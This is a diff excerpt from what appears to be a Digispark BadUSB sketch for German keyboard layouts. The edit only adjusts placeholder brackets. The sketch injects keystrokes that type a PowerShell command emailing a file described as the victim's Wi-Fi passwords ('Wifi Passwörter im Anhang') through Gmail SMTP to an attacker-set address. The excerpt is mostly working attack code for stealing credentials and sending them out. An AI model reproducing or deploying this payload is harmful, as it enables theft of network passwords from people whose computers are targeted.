@@ -27,7 +27,7 @@ void loop() {
   DigiKeyboardDe.sendKeyStroke(KEY_ARROW_LEFT);
   DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
   DigiKeyboardDe.delay(1000);
-  DigiKeyboardDe.print(F("$Username = '<EMAIL_BENUTZERNAME>';$Password = 'EMAIL_PASSWORT';$pass = ConvertTo-SecureString -AsPlainText $Password -Force;$SecureString = $pass;$MySecureCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username,$SecureString; $From = '<ABSENDER_EMAILADRESSE>';$To = 'EMPFÄNGER_EMAILADRESSE';$Attachment = 'temp.csv';$Subject = 'Digispark Wlan';$Body = 'Wifi Passwörter im Anhang';$SMTPServer = 'smtp.gmail.com';$SMTPPort = '587';Send-MailMessage -From $From -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl -Credential $MySecureCreds -Attachments $Attachment;exit"));
+  DigiKeyboardDe.print(F("$Username = '<EMAIL_BENUTZERNAME>';$Password = '<EMAIL_PASSWORT>';$pass = ConvertTo-SecureString -AsPlainText $Password -Force;$SecureString = $pass;$MySecureCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username,$SecureString; $From = '<ABSENDER_EMAILADRESSE>';$To = '<EMPFÄNGER_EMAILADRESSE>';$Attachment = 'temp.csv';$Subject = 'Digispark Wlan';$Body = 'Wifi Passwörter im Anhang';$SMTPServer = 'smtp.gmail.com';$SMTPPort = '587';Send-MailMessage -From $From -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl -Credential $MySecureCreds -Attachments $Attachment;exit"));
   DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
   DigiKeyboardDe.delay(1000);
   DigiKeyboardDe.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
